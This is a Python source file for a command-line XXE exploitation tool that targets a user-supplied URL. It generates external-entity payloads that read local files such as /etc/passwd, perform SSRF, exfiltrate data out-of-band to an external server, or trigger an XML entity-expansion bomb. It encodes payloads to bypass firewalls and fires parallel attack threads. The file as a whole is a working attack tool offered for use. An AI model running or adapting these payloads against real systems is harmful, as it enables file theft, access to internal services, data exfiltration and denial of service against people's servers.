import requests
import argparse
import logging
import base64
import threading
import time

class Logger:
    @staticmethod
    def setup_logger():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler("xxe_exploits.log"),
                logging.StreamHandler()
            ]
        )

class XXEExploiter:
    def __init__(self, url, method, headers, cookies, attack_type, target_path=None, encoding=None):
        self.url = url
        self.method = method.upper()
        self.headers = headers
        self.cookies = cookies
        self.attack_type = attack_type
        self.target_path = target_path
        self.encoding = encoding
        self.payload = self.generate_payload()

    def encode_payload(self, payload):
        """Applies encoding techniques to evade WAF."""
        if self.encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif self.encoding == "hex":
            return "".join(hex(ord(c))[2:] for c in payload)
        return payload  # No encoding applied

    def generate_payload(self):
        """Generates an XXE payload based on attack type and encoding."""
        if self.attack_type == "file_read":
            if not self.target_path:
                self.target_path = "/etc/passwd"  
            payload = f"""<?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{self.target_path}">]>
            <root><data>&xxe;</data></root>"""

        elif self.attack_type == "ssrf":
            if not self.target_path:
                logging.error("[!] Internal URL required for SSRF.")
                raise ValueError("SSRF target required.")
            payload = f"""<?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.target_path}">]>
            <root><data>&xxe;</data></root>"""

        elif self.attack_type == "blind_oob":
            if not self.target_path:
                logging.error("[!] External server required for blind OOB exfiltration.")
                raise ValueError("OOB target required.")
            payload = f"""<?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.target_path}?data=exfiltrated">]>
            <root><data>&xxe;</data></root>"""

        elif self.attack_type == "xml_bomb":
            payload = """<?xml version="1.0"?>
            <!DOCTYPE bomb [
            <!ENTITY a "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
            <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
            <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
            ]>
            <root><data>&c;</data></root>"""

        else:
            logging.error(f"[!] Invalid attack type: {self.attack_type}")
            raise ValueError("Invalid attack type specified.")

        return self.encode_payload(payload)

    def send_request(self):
        """Sends the generated XXE payload to the target."""
        try:
            logging.info(f"[*] Testing {self.url} with {self.attack_type} using {self.encoding if self.encoding else 'plain'} payload...")

            if self.method == "GET":
                response = requests.get(self.url, params={"xml": self.payload}, headers=self.headers, cookies=self.cookies, timeout=10)
            else:
                response = requests.post(self.url, data=self.payload, headers=self.headers, cookies=self.cookies, timeout=10)

            self.analyze_response(response)

        except requests.RequestException as e:
            logging.error(f"[!] Request failed: {e}")

    def analyze_response(self, response):
        """Analyzes the response for indicators of success."""
        if response.status_code == 200:
            if "root:x" in response.text:  
                logging.info("[+] SUCCESS: File Read Exploited! /etc/passwd found.")
            elif "admin" in response.text:  
                logging.info("[+] SUCCESS: SSRF Attack Worked! Internal admin panel exposed.")
            elif "Exfiltrated" in response.text:
                logging.info("[+] SUCCESS: Blind XXE OOB worked! Data exfiltrated to external server.")
            else:
                logging.info("[!] XXE attempted, but no clear success indicators.")
        else:
            logging.warning(f"[!] Received status code {response.status_code}")

class CLI:
    @staticmethod
    def parse_args():
        parser = argparse.ArgumentParser(description="Advanced XXE Exploiter with WAF Bypass Techniques")
        parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com/xml)")
        parser.add_argument("-m", "--method", choices=["GET", "POST"], default="POST", help="HTTP Method")
        parser.add_argument("-H", "--headers", nargs="*", default=[], help="Custom headers (e.g., Authorization: Bearer token)")
        parser.add_argument("-c", "--cookies", nargs="*", default=[], help="Session cookies (e.g., PHPSESSID=123456)")
        parser.add_argument("-a", "--attack", choices=["file_read", "ssrf", "blind_oob", "xml_bomb"], required=True, help="Attack type")
        parser.add_argument("-t", "--target", help="Target file (for file_read) or internal/external URL (for ssrf and blind_oob)")
        parser.add_argument("-e", "--encoding", choices=["base64", "hex"], help="Encoding technique to bypass WAF")

        args = parser.parse_args()

        headers_dict = {h.split(":")[0]: h.split(":")[1] for h in args.headers} if args.headers else {}
        cookies_dict = {c.split("=")[0]: c.split("=")[1] for c in args.cookies} if args.cookies else {}

        return args.url, args.method, headers_dict, cookies_dict, args.attack, args.target, args.encoding

def run_attack(url, method, headers, cookies, attack_type, target, encoding):
    exploiter = XXEExploiter(url, method, headers, cookies, attack_type, target, encoding)
    exploiter.send_request()

if __name__ == "__main__":
    try:
        Logger.setup_logger()
        url, method, headers, cookies, attack_type, target, encoding = CLI.parse_args()
        logging.info(f"[+] Scanning {url} with {attack_type} attack using {encoding if encoding else 'no'} encoding")

        threads = []
        for _ in range(5):  # Launch 5 parallel attack requests
            thread = threading.Thread(target=run_attack, args=(url, method, headers, cookies, attack_type, target, encoding))
            thread.start()
            threads.append(thread)
            time.sleep(1)  # Prevent overwhelming the server immediately

        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        logging.warning("[-] Scan interrupted by user.")
    except Exception as e:
        logging.error(f"[-] Error: {e}")
